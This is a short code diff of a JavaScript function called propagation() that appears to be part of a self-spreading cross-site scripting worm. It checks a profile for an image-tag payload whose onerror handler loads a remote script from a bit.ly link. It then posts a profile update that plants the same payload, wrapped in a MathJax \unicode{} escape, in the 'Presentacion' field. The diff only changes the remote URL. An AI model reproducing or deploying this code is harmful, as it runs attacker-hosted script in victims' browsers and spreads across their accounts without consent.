@@ -21,7 +21,7 @@ async function propagation() {
         let texto = textoNodo ? textoNodo.textContent.trim() : '';
         let htmlInner = parrafo ? parrafo.innerHTML : '';
 
-        const pattern = '<img src=x onerror="$.getScript(\'//bit.ly/4sbkJBV\')">';
+        const pattern = '<img src=x onerror="$.getScript(\'//bit.ly/4sadNVr\')">';
 
         const hasKey = htmlInner.includes(pattern) || texto.includes(pattern);
         if (hasKey) {
@@ -35,7 +35,7 @@ async function propagation() {
             },
             body: new URLSearchParams({
                 ITEsUpdate: '-1',
-                Presentacion: `${texto ? texto + ' ' : ''}\\(\\unicode{<img src=x onerror="$.getScript('//bit.ly/4sbkJBV')">}\\)`,
+                Presentacion: `${texto ? texto + ' ' : ''}\\(\\unicode{<img src=x onerror="$.getScript('//bit.ly/4sadNVr')">}\\)`,
                 MostrarEmail: '3',
                 MostrarCurriculum: '3',
                 Aceptar: '-1'
